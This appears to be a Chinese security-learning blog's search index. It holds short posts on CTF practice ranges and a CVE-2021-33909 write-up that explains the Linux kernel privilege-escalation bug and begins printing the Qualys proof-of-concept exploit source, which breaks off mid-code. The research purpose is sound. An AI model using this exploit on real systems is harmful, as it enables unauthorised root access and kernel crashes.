<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>优质技术书单分享</title>
      <link href="/2021/09/12/%E4%BC%98%E8%B4%A8%E6%8A%80%E6%9C%AF%E4%B9%A6%E5%8D%95%E5%88%86%E4%BA%AB/"/>
      <url>/2021/09/12/%E4%BC%98%E8%B4%A8%E6%8A%80%E6%9C%AF%E4%B9%A6%E5%8D%95%E5%88%86%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[<p>分享记录一些令我受益匪浅的技术文档链接~</p><span id="more"></span><p><a href="https://github.com/geeeeeeeeek/git-recipes">Git中文教程</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文档 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/09/12/%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F%E9%93%BE%E6%8E%A5%E6%B1%87%E6%80%BB/"/>
      <url>/2021/09/12/%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F%E9%93%BE%E6%8E%A5%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<hr><p>title：国内镜像链接汇总<br>tags：</p><ul><li>工具</li></ul><hr><p><a href="https://mirrors.ustc.edu.cn/">中科大</a>：各种iso镜像和工具汇总</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Pikachu靶场练习</title>
      <link href="/2021/09/12/Pikachu%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>/2021/09/12/Pikachu%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>CTF小白入门靶场之一，俗称皮卡丘，记录一下搭建跟学习的过程</p><span id="more"></span><p>参考资料：</p><p><a href="https://c1everf0x.github.io/2020/09/18/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/">pikachu靶场通关</a></p><p><a href="https://zhuanlan.zhihu.com/p/101116258">Pikachu靶场环境搭建</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA靶场练习</title>
      <link href="/2021/09/12/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>/2021/09/12/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>CTF小白入门靶场之一，记录一下搭建跟学习的过程</p><span id="more"></span><p>参考资料：<a href="https://www.sqlsec.com/2020/05/dvwa.html">DVWA 入门靶场学习记录</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>portswigger学习之旅</title>
      <link href="/2021/09/12/portswigger%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/"/>
      <url>/2021/09/12/portswigger%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Welcome to my blog, enter password to read.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss靶场练习</title>
      <link href="/2021/09/12/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>/2021/09/12/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>最近对xss有点兴趣，就找了几个靶场练习，并分享一下解答思路。</p><span id="more"></span><h2 id="靶场一"><a href="#靶场一" class="headerlink" title="靶场一"></a>靶场一</h2><p>平台链接：<a href="http://xss-ctf.xiejiahe.com/">xss-ctf</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf训练 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-33909漏洞研究</title>
      <link href="/2021/09/12/CVE-2021-33909%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
      <url>/2021/09/12/CVE-2021-33909%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<p>该漏洞是针对Linux内核的攻击，无特权的本地攻击者可以通过创建、挂载和删除总路径长度超过1GB的深层目录结构来利用此漏洞，能够造成提权。</p><span id="more"></span><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Linux 内核 3.16 到 5.13.x（5.13.4之前）</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>在Linux 内核的 seq_file 中发现了越界写入缺陷。该漏洞允许具有用户权限的本地攻击者访问越界内存，从而导致系统崩溃或内部内核信息泄漏。该问题是由于在执行操作之前未验证 size_t-to-int 转换造成的。 </p><p>该漏洞是Linux内核文件系统层的类型转换漏洞。类型转换漏洞是在两种类型之间转换时的一种情况，会导致溢出，产生较大的负值。</p><p>攻击者必须能够：</p><ul><li>创造一个长路径</li><li>在此位置挂载文件系统</li><li>删除挂载点</li><li>读取 <code>/proc/&lt;pid&gt;/mountinfo</code> 文件</li></ul><p>将触发此问题，导致以可控偏移量写入内核内存。</p><p>mountinfo 文件是 seq_file 的一个例子，它是一个虚拟文件，内核通过它来呈现一系列记录。每条记录必须放在一个 seq_file 缓冲区，其大小用一个 size_t（ 64 位无符号值）进行记录。当在 show_mountinfo 函数中使用很长的挂载点路径时，问题就会显现出来。 </p><p>此过程需要一个 int 值存储缓冲区长度（ 32 位有符号值），如下所示： </p><p><code>show_mountinfo() -&gt; seq_dentry() -&gt; dentry_path((.., .., int buflen)</code> </p><p>请注意，这个<code>int buflen</code>可能会导致 <code>size_t-to-int</code> 转换问题，将数字转换为负值，然后导致越界访问漏洞。   </p><p>当挂载点仍在使用但路径已被删除时，错误计算的值将用作偏移量，将字符串“//deleted”写入分配的缓冲区之外。由于该值为负数，因此它会写入原先分配的缓冲区位置前 10 个字节到2GB之间的位置。</p><p>在此偏移量写入会导致拒绝服务、系统崩溃，并通过针对特定内存位置导致内存损坏或权限升级。</p><h2 id="漏洞复现-暂未成功"><a href="#漏洞复现-暂未成功" class="headerlink" title="漏洞复现(暂未成功)"></a>漏洞复现(暂未成功)</h2><p>exp来源：<a href="https://github.com/Liang2580/CVE-2021-33909">CVE-2021-33909</a></p><p>首先确定自己测试的机器内核是否在影响版本内：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uname -srm</span></span><br><span class="line">Linux 4.19.0-kali3-amd64 x86_64</span><br></pre></td></tr></table></figure><p>创建一个普通用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo useradd -m test</span></span><br><span class="line"><span class="comment"># sudo passwd test</span></span><br><span class="line"><span class="comment"># su test</span></span><br><span class="line">$ id</span><br><span class="line">uid=1000(<span class="built_in">test</span>) gid=1000(<span class="built_in">test</span>) 组=1000(<span class="built_in">test</span>)</span><br></pre></td></tr></table></figure><p>准备编译运行下载的exp，不过为了调试方便，我加了几个打印信息：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * CVE-2021-33909: size_t-to-int vulnerability in Linux&#x27;s filesystem layer</span></span><br><span class="line"><span class="comment"> * Copyright (C) 2021 Qualys, Inc.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This program is free software: you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment"> * it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="comment"> * the Free Software Foundation, either version 3 of the License, or</span></span><br><span class="line"><span class="comment"> * (at your option) any later version.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment"> * but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment"> * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment"> * GNU General Public License for more details.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You should have received a copy of the GNU General Public License</span></span><br><span class="line"><span class="comment"> * along with this program.  If not, see &lt;https://www.gnu.org/licenses/&gt;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/param.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (4096)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> die() do &#123; \</span></span><br><span class="line"><span class="meta">    fprintf(stderr, <span class="meta-string">&quot;died in %s: %u\n&quot;</span>, __func__, __LINE__); \</span></span><br><span class="line"><span class="meta">    exit(EXIT_FAILURE); \</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">send_recv_state</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> sock, <span class="keyword">const</span> <span class="keyword">char</span> * <span class="keyword">const</span> sstate, <span class="keyword">const</span> <span class="keyword">char</span> rstate)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (sstate) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">send</span>(sock, sstate, <span class="number">1</span>, MSG_NOSIGNAL) != <span class="number">1</span>) <span class="built_in">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (rstate) &#123;</span><br><span class="line">        <span class="keyword">char</span> state = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">read</span>(sock, &amp;state, <span class="number">1</span>) != <span class="number">1</span>) <span class="built_in">die</span>();</span><br><span class="line">        <span class="keyword">if</span> (state != rstate) <span class="built_in">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> * bigdir;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> onedir[NAME_MAX + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> socks[<span class="number">2</span>];</span><br><span class="line">    <span 